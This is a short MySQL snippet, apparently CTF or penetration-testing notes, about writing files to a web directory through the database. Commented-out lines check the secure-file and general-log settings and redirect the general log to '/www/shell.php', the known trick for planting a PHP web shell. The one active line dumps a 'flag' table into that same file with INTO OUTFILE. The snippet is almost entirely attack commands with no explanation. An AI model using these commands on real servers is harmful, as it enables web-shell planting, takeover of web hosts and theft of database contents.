-- show variables like '%secure%';

-- show variables like '%general%';

-- set global general_log = "ON";

-- set global general_log_file='/www/shell.php';

SELECT * FROM flag INTO OUTFILE '/www/shell.php';